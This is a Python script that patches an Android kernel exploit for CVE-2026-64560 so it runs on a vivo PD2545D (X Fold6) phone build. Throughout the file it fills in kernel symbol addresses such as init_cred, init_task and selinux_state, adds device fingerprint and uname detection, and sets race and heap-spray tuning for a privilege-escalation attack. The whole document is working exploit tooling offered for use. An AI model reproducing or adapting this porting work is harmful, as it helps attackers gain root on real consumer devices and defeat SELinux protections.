#!/usr/bin/env python3
"""Patch the PLZ110 6.12.69 CVE-2026-64560 payload into a PD2545D (r59) port.

Symbols come from the public GKI android16-6.12-2025-12_r59 Image (6.12.58
lineage). Direct aliases assume PHYS_DELTA=0 (target.h); the device /proc/iomem
is root-only, so --preflight may run but --run must wait for a physical-layout
confirmation.
"""
import re
import sys

SRC = 'cve-2026-64560-fanout.c'
DST = 'cve-2026-64560-pd2545.c'

src = open(SRC, encoding='utf-8').read()

# 1) LINK_* values -> r59 symbols
# CERTIFIED production Image (boot-6.12.img, image_size 0x2820000), not the
# debug all-syms Image (0x36a0000): the two builds have different layouts and
# every symbol address differs. BTF/vuln-check are from the certified Image too.
links = {
    'LINK_CYCLE_C': '0xffffffc08253e278',
    'LINK_CYCLE_D': '0xffffffc08253ef10',
    'LINK_MISC_LIST': '0xffffffc08265e238',
    'LINK_SYSCTL_BOOTID': '0xffffffc0827e8d88',
    'LINK_UHID_MISC': '0xffffffc082699a18',
    'LINK_UHID_FOPS': '0xffffffc08145f8d0',
    'LINK_UHID_CHAR_OPEN': '0xffffffc080e96d5c',
    'LINK_UHID_CHAR_WRITE': '0xffffffc080e965d8',
    'LINK_UHID_CHAR_RELEASE': '0xffffffc080e96e80',
    'LINK_CONFIGFS_READ_ITER': '0xffffffc08073a0ac',
    'LINK_CONFIGFS_BIN_WRITE_ITER': '0xffffffc08073a658',
    'LINK_MODULE_DIRECT_BASE': '0xffffffc081926090',
    'LINK_MODULE_PLT_BASE': '0xffffffc081926098',
    'LINK_MEMSTART_ADDR': '0xffffffc081926078',
    'LINK_KIMAGE_VOFFSET': '0xffffffc081927000',
    'LINK_KMALLOC_CACHES': '0xffffffc08192e4c0',
    'LINK_ANON_PIPE_BUF_OPS': '0xffffffc0812eb608',
    'LINK_INIT_TASK': '0xffffffc08253dac0',
    'LINK_INIT_CRED': '0xffffffc082553840',
    'LINK_SELINUX_BLOB_SIZES': '0xffffffc081938868',
    'LINK_SELINUX_STATE': '0xffffffc0827c69a0',
    'LINK_SDATA': '0xffffffc082520000',
    'LINK_END': '0xffffffc082820000',
}
for name, value in links.items():
    pat = re.compile(r'(#define\s+' + name + r'\s+UINT64_C\()0x[0-9a-fA-F]+(\))')
    src, count = pat.subn(r'\g<1>' + value + r'\g<2>', src)
    if count != 1:
        sys.exit(f'{name}: expected 1 replacement, got {count}')

# 2) PD2545 direct constants (PHYS_DELTA=0 assumption)
anchor = '#define PLZ110_DIRECT_CYCLE_C UINT64_C(0xffffff8049dee078)\n'
addition = anchor + '''/* PD2545D / vivo X Fold6 / MT6993 (6.12.58 lineage).
 * R59 = public GKI android16-6.12-2025-12_r59; the device build is a private
 * respin (dd6fd5c98918 + Aug ASB), so every value here is a baseline that
 * must be validated by the read-only gates first.
 * PHYS_DELTA assumed 0 (target.h TARGET_KERNEL_PHYS_LOAD_DELTA); the device
 * /proc/iomem is root-only. DO NOT run --run until it is confirmed. */
#define PD2545_DIRECT_BOOTID_PARENT UINT64_C(0xffffff800265e198)
#define PD2545_DIRECT_CYCLE_C UINT64_C(0xffffff800253e278)
'''
if src.count(anchor) != 1:
    sys.exit('PLZ110 direct anchor not unique')
src = src.replace(anchor, addition)

# 3) enum
old = '    STANDALONE_PROFILE_PLZ110,\n};\n'
new = '    STANDALONE_PROFILE_PLZ110,\n    STANDALONE_PROFILE_PD2545,\n};\n'
if src.count(old) != 1:
    sys.exit('enum anchor not unique')
src = src.replace(old, new)

# 4) detect: uname fast path
old = '''        if (!uname(&kver) && strstr(kver.release, "242e1a07f878"))
            return STANDALONE_PROFILE_PLZ110;
    }'''
new = '''        if (!uname(&kver) && strstr(kver.release, "242e1a07f878"))
            return STANDALONE_PROFILE_PLZ110;
        if (!uname(&kver) && strstr(kver.release, "dd6fd5c98918"))
            return STANDALONE_PROFILE_PD2545;
    }'''
if src.count(old) != 1:
    sys.exit('uname anchor not unique')
src = src.replace(old, new)

# 4b) fingerprint string + check before cmdline read
old = '''    static const char plz110[] =
        "OnePlus/PLZ110/OP64DDL1:17/CP2A.260605.016/B.34f780d-ee9c62-ef681b:user/release-keys";
'''
new = old + '''    static const char pd2545[] =
        "vivo/PD2545/PD2545:17/CP2A.260605.016_V000L1/261012214913:user/release-keys";
'''
if src.count(old) != 1:
    sys.exit('plz110 fingerprint anchor not unique')
src = src.replace(old, new)

old = '''    if (!strcmp(fingerprint, plz110) && !strcmp(device, "OP64DDL1") &&
        strcmp(hardware, "gem5") && qemu[0] == '\\0')
        return STANDALONE_PROFILE_PLZ110;
'''
new = old + '''    if (!strcmp(fingerprint, pd2545) && !strcmp(device, "PD2545"))
        return STANDALONE_PROFILE_PD2545;
'''
if src.count(old) != 1:
    sys.exit('plz110 fingerprint check anchor not unique')
src = src.replace(old, new)

# 5) configure branch after PLZ110
old = '''        direct_bootid_parent = PLZ110_DIRECT_BOOTID_PARENT;
        direct_cycle_c = PLZ110_DIRECT_CYCLE_C;
        pipe_reclaim_count = 80;
    } else {
'''
new = '''        direct_bootid_parent = PLZ110_DIRECT_BOOTID_PARENT;
        direct_cycle_c = PLZ110_DIRECT_CYCLE_C;
        pipe_reclaim_count = 80;
    } else if (profile == STANDALONE_PROFILE_PD2545) {
        profile_name = "pd2545-dd6fd5c98918";
        repeats = "4";
        batch = "1";
        attempts = "48";
        controlled_attempts = "48";
        race_exec_repeats = 4;
        race_batch = 1;
        controlled_race_batch = 1;
        max_attempts = 48;
        controlled_max_attempts = 48;
        timer_goal = 55478;
        worker_goal = 5;
        pipe_count = 6000;
        exec_after_deleted = 100;
        irq_arm_after_deleted = -1;
        irq_batch_fds = 1;
        irq_batch_period_ns = 50000;
        irq_arm_lead_ns = 250000000;
        irq_release_base_ns = 20000;
        irq_release_step_ns = 20000;
        rcu_wait_us = 150000;
        watcher_timeout_ms = 2000;
        accept_first_exec_overlap = 1;
        slab_gate_ignore_total = 1;
        direct_bootid_parent = PD2545_DIRECT_BOOTID_PARENT;
        direct_cycle_c = PD2545_DIRECT_CYCLE_C;
        pipe_reclaim_count = 80;
    } else {
'''
if src.count(old) != 1:
    sys.exit('configure branch anchor not unique')
src = src.replace(old, new)

# 6) setenv profile conditions
old = '(profile == STANDALONE_PROFILE_DADA ||\n        profile == STANDALONE_PROFILE_PLZ110)'
new = ('(profile == STANDALONE_PROFILE_DADA ||\n'
       '        profile == STANDALONE_PROFILE_PLZ110 ||\n'
       '        profile == STANDALONE_PROFILE_PD2545)')
src = src.replace(old, new)

old = 'if (profile == STANDALONE_PROFILE_PLZ110 && setenv("TIMER_GOAL", "55478", 1))'
new = ('if ((profile == STANDALONE_PROFILE_PLZ110 ||\n'
       '        profile == STANDALONE_PROFILE_PD2545) && setenv("TIMER_GOAL", "55478", 1))')
src = src.replace(old, new)

old = 'if (profile == STANDALONE_PROFILE_PLZ110) {
        if (setenv("PIPE_COUNT", "6000", 1))'
new = 'if (profile == STANDALONE_PROFILE_PLZ110 || profile == STANDALONE_PROFILE_PD2545) {
        if (setenv("PIPE_COUNT", "6000", 1))'
src = src.replace(old, new)

# 7) direct_bootid_parent profile conditions
old = '''    if ((direct_bootid_parent != DADA_DIRECT_BOOTID_PARENT &&
         direct_bootid_parent != PLZ110_DIRECT_BOOTID_PARENT) || sequence <= 0)'''
new = '''    if ((direct_bootid_parent != DADA_DIRECT_BOOTID_PARENT &&
         direct_bootid_parent != PLZ110_DIRECT_BOOTID_PARENT &&
         direct_bootid_parent != PD2545_DIRECT_BOOTID_PARENT) || sequence <= 0)'''
if src.count(old) != 1:
    sys.exit('stage0 baseline condition anchor not unique')
src = src.replace(old, new)

old = '''    int use_delete_cpus = (direct_bootid_parent == DADA_DIRECT_BOOTID_PARENT ||
         direct_bootid_parent == PLZ110_DIRECT_BOOTID_PARENT) &&'''
new = '''    int use_delete_cpus = (direct_bootid_parent == DADA_DIRECT_BOOTID_PARENT ||
         direct_bootid_parent == PLZ110_DIRECT_BOOTID_PARENT ||
         direct_bootid_parent == PD2545_DIRECT_BOOTID_PARENT) &&'''
if src.count(old) != 1:
    sys.exit('use_delete_cpus anchor not unique')
src = src.replace(old, new)

old = '''    if (direct_bootid_parent == DADA_DIRECT_BOOTID_PARENT ||
        direct_bootid_parent == PLZ110_DIRECT_BOOTID_PARENT)
        printf("DADA_SUCCESS_SCHEDULE'''
new = '''    if (direct_bootid_parent == DADA_DIRECT_BOOTID_PARENT ||
        direct_bootid_parent == PLZ110_DIRECT_BOOTID_PARENT ||
        direct_bootid_parent == PD2545_DIRECT_BOOTID_PARENT)
        printf("DADA_SUCCESS_SCHEDULE'''
if src.count(old) != 1:
    sys.exit('dada schedule anchor not unique')
src = src.replace(old, new)

# 8) preflight marker + hint
src = src.replace('PREFLIGHT_PASS profile=plz110-242e1a07f878-ce21',
                  'PREFLIGHT_PASS profile=pd2545-dd6fd5c98918')
src = src.replace('6.12.69-android16-6-g242e1a07f878-ab15865446-4k',
                  '6.12.58-android16-6-gdd6fd5c98918-abogki543627742-4k (r59 symbols)')

open(DST, 'w', encoding='utf-8').write(src)
print('wrote', DST, len(src), 'bytes')
for key in ('STANDALONE_PROFILE_PD2545', 'PD2545_DIRECT_BOOTID_PARENT',
            'pd2545-dd6fd5c98918', 'dd6fd5c98918'):
    print(key, src.count(key))
